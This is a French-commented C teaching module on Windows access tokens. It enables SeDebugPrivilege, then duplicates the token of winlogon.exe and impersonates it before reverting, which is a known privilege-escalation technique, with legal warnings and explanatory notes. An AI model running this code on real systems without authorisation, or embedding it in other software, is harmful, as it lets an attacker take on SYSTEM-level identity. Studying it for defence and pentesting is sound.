/*
 * ═══════════════════════════════════════════════════════════════════
 * Module 34 : Token Manipulation - Manipulation des Access Tokens Windows
 * ═══════════════════════════════════════════════════════════════════
 *
 * ⚠️  AVERTISSEMENT LÉGAL STRICT ⚠️
 *
 * Ce code est fourni UNIQUEMENT à des fins éducatives et de recherche.
 * L'utilisation de ces techniques sur des systèmes sans autorisation
 * explicite est ILLÉGALE et peut entraîner des poursuites pénales.
 *
 * UTILISATIONS LÉGALES UNIQUEMENT :
 * - Environnements de test isolés avec autorisation
 * - Recherche académique éthique
 * - Développement d'outils d'administration légitimes
 * - Pentesting contractuel avec autorisation écrite
 *
 * L'auteur décline toute responsabilité pour usage illégal.
 * ═══════════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

#define SEPARATEUR "═══════════════════════════════════════════════════════════════════\n"

// ═══════════════════════════════════════════════════════════════════
// Prototypes de fonctions
// ═══════════════════════════════════════════════════════════════════

void afficher_titre(const char *titre);
void afficher_token_info(HANDLE hToken);
BOOL activer_privilege(HANDLE hToken, LPCSTR privilege);
BOOL activer_debug_privilege();
HANDLE ouvrir_process_token(DWORD pid);
BOOL dupliquer_token(HANDLE hSourceToken, HANDLE *phNewToken);
void demonstrer_query_token();
void demonstrer_privilege_elevation();
void demonstrer_token_impersonation();
DWORD trouver_pid_par_nom(const char *nom_process);

// ═══════════════════════════════════════════════════════════════════
// Fonction : Afficher un titre formaté
// ═══════════════════════════════════════════════════════════════════

void afficher_titre(const char *titre) {
    printf("\n");
    printf(SEPARATEUR);
    printf("  %s\n", titre);
    printf(SEPARATEUR);
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Afficher les informations d'un token
// ═══════════════════════════════════════════════════════════════════

void afficher_token_info(HANDLE hToken) {
    TOKEN_USER tokenUser;
    TOKEN_STATISTICS tokenStats;
    TOKEN_ELEVATION_TYPE elevationType;
    TOKEN_MANDATORY_LABEL tokenLabel;
    DWORD dwSize = 0;
    char userName[256];
    char domainName[256];
    DWORD userSize = sizeof(userName);
    DWORD domainSize = sizeof(domainName);
    SID_NAME_USE sidType;

    printf("\n[+] Informations du Token :\n");

    // Récupérer TOKEN_USER
    if (GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize)) {
        if (LookupAccountSid(NULL, tokenUser.User.Sid, userName, &userSize,
                            domainName, &domainSize, &sidType)) {
            printf("    Utilisateur : %s\\%s\n", domainName, userName);
        }
    }

    // Récupérer TOKEN_STATISTICS
    if (GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwSize)) {
        printf("    Token ID : %lu-%lu\n", tokenStats.TokenId.HighPart, tokenStats.TokenId.LowPart);
        printf("    Type : %s\n", tokenStats.TokenType == TokenPrimary ? "Primary" : "Impersonation");
        printf("    Niveau impersonation : %d\n", tokenStats.ImpersonationLevel);
    }

    // Récupérer niveau d'élévation
    if (GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize)) {
        printf("    Elevation : ");
        switch (elevationType) {
            case TokenElevationTypeDefault: printf("Default (pas UAC)\n"); break;
            case TokenElevationTypeFull: printf("Full (élevé)\n"); break;
            case TokenElevationTypeLimited: printf("Limited (restreint)\n"); break;
        }
    }

    // Récupérer niveau d'intégrité
    BYTE buffer[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE];
    PTOKEN_MANDATORY_LABEL ptml = (PTOKEN_MANDATORY_LABEL)buffer;

    if (GetTokenInformation(hToken, TokenIntegrityLevel, ptml, sizeof(buffer), &dwSize)) {
        DWORD integrity = *GetSidSubAuthority(ptml->Label.Sid,
                          *GetSidSubAuthorityCount(ptml->Label.Sid) - 1);
        printf("    Intégrité : ");
        if (integrity < SECURITY_MANDATORY_LOW_RID) printf("Untrusted\n");
        else if (integrity < SECURITY_MANDATORY_MEDIUM_RID) printf("Low\n");
        else if (integrity < SECURITY_MANDATORY_HIGH_RID) printf("Medium\n");
        else if (integrity < SECURITY_MANDATORY_SYSTEM_RID) printf("High\n");
        else printf("System\n");
    }
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Activer un privilège spécifique dans un token
// ═══════════════════════════════════════════════════════════════════

BOOL activer_privilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        printf("[-] Échec LookupPrivilegeValue : %lu\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
                              NULL, NULL)) {
        printf("[-] Échec AdjustTokenPrivileges : %lu\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] Le privilège %s n'est pas assigné à ce token\n", privilege);
        return FALSE;
    }

    printf("[+] Privilège %s activé avec succès\n", privilege);
    return TRUE;
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Activer SeDebugPrivilege pour le processus actuel
// ═══════════════════════════════════════════════════════════════════

BOOL activer_debug_privilege() {
    HANDLE hToken;

    printf("\n[*] Tentative d'activation de SeDebugPrivilege...\n");

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] Échec OpenProcessToken : %lu\n", GetLastError());
        return FALSE;
    }

    BOOL resultat = activer_privilege(hToken, SE_DEBUG_NAME);
    CloseHandle(hToken);

    return resultat;
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Trouver PID par nom de processus
// ═══════════════════════════════════════════════════════════════════

DWORD trouver_pid_par_nom(const char *nom_process) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, nom_process) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Ouvrir le token d'un processus distant
// ═══════════════════════════════════════════════════════════════════

HANDLE ouvrir_process_token(DWORD pid) {
    HANDLE hProcess;
    HANDLE hToken = NULL;

    printf("\n[*] Tentative d'ouverture du processus PID %lu...\n", pid);

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("[-] Échec OpenProcess : %lu\n", GetLastError());
        return NULL;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] Échec OpenProcessToken : %lu\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    printf("[+] Token du processus ouvert avec succès\n");
    CloseHandle(hProcess);
    return hToken;
}

// ═══════════════════════════════════════════════════════════════════
// Fonction : Dupliquer un token
// ═══════════════════════════════════════════════════════════════════

BOOL dupliquer_token(HANDLE hSourceToken, HANDLE *phNewToken) {
    printf("\n[*] Duplication du token...\n");

    if (!DuplicateTokenEx(hSourceToken,
                         TOKEN_ALL_ACCESS,
                         NULL,
                         SecurityImpersonation,
                         TokenImpersonation,
                         phNewToken)) {
        printf("[-] Échec DuplicateTokenEx : %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Token dupliqué avec succès\n");
    return TRUE;
}

// ═══════════════════════════════════════════════════════════════════
// Démonstration 1 : Query Token Information
// ═══════════════════════════════════════════════════════════════════

void demonstrer_query_token() {
    afficher_titre("DÉMONSTRATION 1 : Query Token Information");

    HANDLE hToken;

    printf("\n[*] Récupération du token du processus actuel...\n");

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("[-] Échec OpenProcessToken : %lu\n", GetLastError());
        return;
    }

    printf("[+] Token récupéré avec succès\n");
    afficher_token_info(hToken);

    CloseHandle(hToken);
}

// ═══════════════════════════════════════════════════════════════════
// Démonstration 2 : Privilege Elevation (SeDebugPrivilege)
// ═══════════════════════════════════════════════════════════════════

void demonstrer_privilege_elevation() {
    afficher_titre("DÉMONSTRATION 2 : Privilege Elevation - SeDebugPrivilege");

    printf("\n[*] Cette démonstration nécessite des droits administrateur\n");
    printf("[*] Si vous n'êtes pas administrateur, cette opération échouera\n");

    if (activer_debug_privilege()) {
        printf("\n[+] SeDebugPrivilege activé !\n");
        printf("[+] Le processus peut maintenant :\n");
        printf("    - Lire/écrire dans la mémoire d'autres processus\n");
        printf("    - Ouvrir des handles vers des processus protégés\n");
        printf("    - Déboguer des processus système\n");
    } else {
        printf("\n[-] Impossible d'activer SeDebugPrivilege\n");
        printf("[-] Raisons possibles :\n");
        printf("    - Processus non exécuté en tant qu'administrateur\n");
        printf("    - Privilège non assigné au compte utilisateur\n");
    }
}

// ═══════════════════════════════════════════════════════════════════
// Démonstration 3 : Token Impersonation
// ═══════════════════════════════════════════════════════════════════

void demonstrer_token_impersonation() {
    afficher_titre("DÉMONSTRATION 3 : Token Impersonation");

    printf("\n[*] Cette démonstration tente d'impersonnifier un autre processus\n");
    printf("[*] Nécessite SeDebugPrivilege et droits administrateur\n\n");

    // Activer SeDebugPrivilege
    if (!activer_debug_privilege()) {
        printf("[-] SeDebugPrivilege requis - Démonstration annulée\n");
        return;
    }

    // Trouver un processus système (winlogon.exe par exemple)
    DWORD pid = trouver_pid_par_nom("winlogon.exe");
    if (pid == 0) {
        printf("[-] Processus winlogon.exe non trouvé\n");
        printf("[*] Tentative avec explorer.exe...\n");
        pid = trouver_pid_par_nom("explorer.exe");
        if (pid == 0) {
            printf("[-] Aucun processus cible trouvé\n");
            return;
        }
    }

    printf("[+] Processus cible trouvé : PID %lu\n", pid);

    // Ouvrir le token du processus cible
    HANDLE hSourceToken = ouvrir_process_token(pid);
    if (!hSourceToken) {
        return;
    }

    // Dupliquer le token
    HANDLE hDuplicatedToken;
    if (!dupliquer_token(hSourceToken, &hDuplicatedToken)) {
        CloseHandle(hSourceToken);
        return;
    }

    // Afficher les informations du token dupliqué
    printf("\n[+] Informations du token SOURCE :\n");
    afficher_token_info(hSourceToken);

    printf("\n[+] Informations du token DUPLIQUÉ :\n");
    afficher_token_info(hDuplicatedToken);

    // Impersonnification
    printf("\n[*] Tentative d'impersonnification...\n");
    if (ImpersonateLoggedOnUser(hDuplicatedToken)) {
        printf("[+] Impersonnification réussie !\n");
        printf("[+] Le thread actuel s'exécute maintenant dans le contexte de sécurité du token dupliqué\n");

        // Révoquer l'impersonnification
        RevertToSelf();
        printf("[+] Impersonnification révoquée - Retour au contexte d'origine\n");
    } else {
        printf("[-] Échec impersonnification : %lu\n", GetLastError());
    }

    CloseHandle(hSourceToken);
    CloseHandle(hDuplicatedToken);
}

// ═══════════════════════════════════════════════════════════════════
// Fonction principale
// ═══════════════════════════════════════════════════════════════════

int main(void) {
    printf(SEPARATEUR);
    printf("  MODULE 34 : TOKEN MANIPULATION\n");
    printf("  Manipulation des Windows Access Tokens\n");
    printf(SEPARATEUR);

    printf("\n⚠️  AVERTISSEMENT LÉGAL ⚠️\n");
    printf("\nCe programme démontre des techniques de manipulation de tokens Windows.\n");
    printf("Ces techniques sont utilisées dans des contextes d'élévation de privilèges.\n\n");
    printf("UTILISATIONS LÉGALES UNIQUEMENT :\n");
    printf("  - Environnement de test isolé avec autorisation\n");
    printf("  - Recherche académique éthique\n");
    printf("  - Développement d'outils légitimes\n\n");
    printf("L'usage non autorisé est ILLÉGAL et peut entraîner des poursuites.\n");
    printf("Appuyez sur ENTRÉE pour continuer (ou CTRL+C pour annuler)...\n");
    getchar();

    // Démonstration 1 : Query Token Information
    demonstrer_query_token();

    printf("\n\nAppuyez sur ENTRÉE pour continuer vers la démonstration 2...\n");
    getchar();

    // Démonstration 2 : Privilege Elevation
    demonstrer_privilege_elevation();

    printf("\n\nAppuyez sur ENTRÉE pour continuer vers la démonstration 3...\n");
    getchar();

    // Démonstration 3 : Token Impersonation
    demonstrer_token_impersonation();

    printf("\n");
    afficher_titre("FIN DES DÉMONSTRATIONS");
    printf("\n[+] Toutes les démonstrations terminées\n");
    printf("[+] Consultez exercice.txt pour des défis pratiques\n\n");

    return 0;
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * Notes techniques importantes
 * ═══════════════════════════════════════════════════════════════════
 *
 * 1. PRIVILÈGES REQUIS :
 *    - SeDebugPrivilege : Nécessaire pour ouvrir des processus protégés
 *    - Droits administrateur : Requis pour la plupart des opérations
 *
 * 2. TYPES DE TOKENS :
 *    - Primary Token : Utilisé pour créer de nouveaux processus
 *    - Impersonation Token : Utilisé pour impersonnification temporaire
 *
 * 3. NIVEAUX D'IMPERSONATION :
 *    - SecurityAnonymous : Serveur ne peut pas identifier le client
 *    - SecurityIdentification : Serveur peut identifier mais pas impersonnifier
 *    - SecurityImpersonation : Serveur peut impersonnifier (utilisé ici)
 *    - SecurityDelegation : Impersonification avec délégation réseau
 *
 * 4. NIVEAUX D'INTÉGRITÉ :
 *    - Untrusted (0) : Processus non fiables
 *    - Low (4096) : Processus Internet Explorer mode protégé
 *    - Medium (8192) : Processus utilisateur standard
 *    - High (12288) : Processus administrateur
 *    - System (16384) : Processus système
 *
 * 5. SÉCURITÉ :
 *    - Toujours révoquer l'impersonnification avec RevertToSelf()
 *    - Fermer tous les handles de tokens
 *    - Vérifier les codes d'erreur
 *    - Logger toutes les opérations sensibles
 *
 * ═══════════════════════════════════════════════════════════════════
 */
